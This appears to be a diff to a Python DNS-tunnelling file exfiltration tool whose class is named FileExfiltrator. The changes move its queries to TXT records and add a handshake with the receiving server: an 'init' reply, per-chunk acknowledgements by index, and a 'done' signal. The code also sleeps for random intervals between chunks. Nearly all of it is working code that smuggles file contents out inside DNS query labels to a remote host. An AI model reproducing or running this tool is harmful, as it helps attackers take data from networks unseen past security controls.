@@ -99,7 +99,7 @@ class FileExfiltrator(threading.Thread):
         qname = qname + '.' + str(self.domain)   
         print(qname)
 
-        query = dnslib.DNSRecord.question(qname)
+        query = dnslib.DNSRecord.question(qname, "TXT")
 
         #q.send(self.address, int(self.port), timeout=1)
         self.sock.sendto(query.pack(), (self.address, int(self.port)))
@@ -109,24 +109,29 @@ class FileExfiltrator(threading.Thread):
 
         except socket.timeout:
             print("Timeout: No response received within the specified timeout.")
+            print("Server unreachable")
             self.sock.close()
-            sys.exit("Exiting due to timeout.")
+            sys.exit(0)
 
         reply = dnslib.DNSRecord.parse(response)
         #print(f"Received DNS response: {reply}")
 
         # Check if the response domain is equal to the request
-        if reply.questions[0].qname == dnslib.DNSLabel(qname) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
-            print("The response domain is equal to the query.")
-
+        if reply.rr:
+            # Parcourez chaque enregistrement de réponse
+            for rr in reply.rr:
+                if str(rr.rdata).replace("\"", "") == "init":
+                    print("Connection initialized")
+                else:
+                    print("Wrong initialization response")
         else:
-            print("Server failed")
+            print("The response does not contain any response records.")
+            print("Wrong initialization response")
+            sys.exit(0)
+            
 
         
         # Start sending file
-
-        
-        
         chunk_index = 0
         while True:
             # Pattern: [sessionID].[chunk_index]. [...] .[domain]
@@ -149,13 +154,35 @@ class FileExfiltrator(threading.Thread):
             labels = self.divide_in_labels(data_chunk)
             qname = f"{self.sessionid}.{chunk_index}." + ".".join(labels) + f".{self.domain}"
             
-            print(qname)
+            #print(qname)
 
-            query = dnslib.DNSRecord.question(qname)
-
+            query = dnslib.DNSRecord.question(qname, "TXT")
             self.sock.sendto(query.pack(), (self.address, int(self.port)))
 
             #print(data)
+
+            try:
+                response, _ = self.sock.recvfrom(1024)
+
+            except socket.timeout:
+                print("Timeout: No response received within the specified timeout.")
+                print("Server failure")
+                self.sock.close()
+                sys.exit(0)
+
+            reply = dnslib.DNSRecord.parse(response)
+
+            if reply.rr:
+                # Browse each answer record
+                for rr in reply.rr:
+                    if str(rr.rdata).replace("\"", "") == str(chunk_index):
+                        print("Packet received")
+                    else:
+                        print("Wrong packet response")
+            else:
+                print("The response does not contain any response records.")
+                print("Wrong initialization response")
+                sys.exit(0)
         
 
             time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
@@ -175,10 +202,34 @@ class FileExfiltrator(threading.Thread):
         qname = qname + '.' + str(self.domain)
         print(qname)
 
-        query = dnslib.DNSRecord.question(qname)
+        query = dnslib.DNSRecord.question(qname, "TXT")
 
         #q.send(self.address, int(self.port), timeout=1)
         self.sock.sendto(query.pack(), (self.address, int(self.port)))
+
+        try:
+            response, _ = self.sock.recvfrom(1024)
+
+        except socket.timeout:
+            print("Timeout: No response received within the specified timeout.")
+            print("Server unreachable")
+            self.sock.close()
+            sys.exit("Exiting due to timeout.")
+
+        reply = dnslib.DNSRecord.parse(response)
+
+        if reply.rr:
+            # Browse each answer record
+            if reply.questions[0].qname == dnslib.DNSLabel(qname) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
+                for rr in reply.rr:
+                    if str(rr.rdata).replace("\"", "") == "done":
+                        print("Transfer completed")
+                    else:
+                        print("Failed to finish transfer")
+        else:
+            print("The response does not contain any response records.")
+            print("Wrong initialization response")
+            sys.exit(0)
 
         #while True:
             #print("Thread for file {} is running...".format(self.file_to_send))
